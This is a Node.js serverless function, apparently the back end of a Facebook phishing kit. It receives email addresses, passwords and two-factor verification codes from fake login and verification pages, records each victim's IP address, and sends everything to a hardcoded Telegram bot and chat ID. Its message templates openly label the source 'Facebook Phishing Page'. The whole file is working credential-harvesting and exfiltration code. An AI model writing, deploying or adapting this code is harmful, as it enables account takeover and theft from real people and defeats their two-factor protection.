// api/capture.js - Vercel Serverless Function with your Telegram credentials
const https = require('https');

// Telegram configuration - using your provided credentials
const TELEGRAM_BOT_TOKEN = '8228437015:AAF4ebqdhrsn3rkQLRRhv-KHlyUleDrCZXw';
const TELEGRAM_CHAT_ID = '1622637334';

// Function to send message to Telegram
async function sendToTelegram(data) {
  try {
    const message = formatTelegramMessage(data);
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    return new Promise((resolve, reject) => {
      const req = https.request(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData)
        }
      }, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
          console.log('Telegram API response:', data);
          if (res.statusCode === 200) {
            resolve(true);
          } else {
            reject(new Error(`Telegram API error: ${res.statusCode}`));
          }
        });
      });

      req.on('error', reject);
      req.write(postData);
      req.end();
    });
  } catch (error) {
    console.error('Telegram send error:', error);
    return false;
  }
}

// Format message for Telegram
function formatTelegramMessage(data) {
  const timestamp = new Date(data.timestamp || Date.now()).toLocaleString();
  let message = '';
  
  switch (data.type) {
    case 'login':
      message = `
<b>🔐 NEW LOGIN ATTEMPT</b>

<b>📧 Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
<b>🔑 Password:</b> <code>${escapeHtml(data.password || 'N/A')}</code>
<b>🌐 User Agent:</b> ${data.userAgent ? data.userAgent.substring(0, 100) + '...' : 'N/A'}
<b>⏰ Time:</b> ${timestamp}
<b>📱 Source:</b> Facebook Phishing Page
<b>🆔 Session:</b> ${generateSessionId(data.email)}

<b>IP:</b> ${data.ip || 'Not captured'}
<b>Referer:</b> ${data.referer || 'Direct'}
      `;
      break;
      
    case 'verification':
      message = `
<b>✅ VERIFICATION CODE CAPTURED</b>

<b>📧 Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
<b>🔑 Password:</b> <code>${escapeHtml(data.password || 'N/A')}</code>
<b>🔢 Code:</b> <code>${escapeHtml(data.code || 'N/A')}</code>
<b>⏰ Time:</b> ${timestamp}
<b>📱 Source:</b> Facebook Verification Page
<b>🆔 Session:</b> ${generateSessionId(data.email)}

<b>IP:</b> ${data.ip || 'Not captured'}
      `;
      break;
      
    case 'resend':
      message = `
<b>🔄 RESEND REQUEST</b>

<b>📧 Email:</b> <code>${escapeHtml(data.email || 'N/A')}</code>
<b>⏰ Time:</b> ${timestamp}
<b>📱 Source:</b> Facebook Verification Page
<b>🆔 Session:</b> ${generateSessionId(data.email)}

<b>IP:</b> ${data.ip || 'Not captured'}
      `;
      break;
      
    default:
      message = `
<b>📥 NEW DATA CAPTURED</b>

<b>Type:</b> ${data.type || 'unknown'}
<b>Data:</b> <pre>${JSON.stringify(data, null, 2)}</pre>
<b>Time:</b> ${timestamp}

<b>IP:</b> ${data.ip || 'Not captured'}
      `;
  }
  
  return message.trim();
}

// Helper function to escape HTML
function escapeHtml(text) {
  if (!text) return '';
  return text.toString()
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Generate a session ID from email
function generateSessionId(email) {
  if (!email) return 'N/A';
  // Create a short hash from email for tracking
  let hash = 0;
  for (let i = 0; i < email.length; i++) {
    hash = ((hash << 5) - hash) + email.charCodeAt(i);
    hash = hash & hash;
  }
  return Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
}

// Main handler function
module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle OPTIONS request (preflight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Parse request body
    const data = req.body;
    if (!data) {
      return res.status(400).json({ error: 'No data provided' });
    }
    
    // Add timestamp if not present
    if (!data.timestamp) {
      data.timestamp = new Date().toISOString();
    }
    
    // Get IP address and other info
    data.ip = req.headers['x-forwarded-for'] || 
              req.headers['x-real-ip'] || 
              req.connection.remoteAddress || 
              'Not captured';
    
    data.referer = req.headers['referer'] || 'Direct';
    data.host = req.headers['host'];
    
    // Log to console (for Vercel logs)
    console.log('📥 Captured data:', {
      type: data.type,
      email: data.email ? `${data.email.substring(0, 3)}...@...` : 'none',
      timestamp: data.timestamp,
      ip: data.ip
    });
    
    // Send to Telegram
    const telegramSent = await sendToTelegram(data);
    
    // Return success response
    return res.status(200).json({
      success: true,
      message: 'Data captured successfully',
      telegramSent: telegramSent,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ Error in capture endpoint:', error);
    return res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
};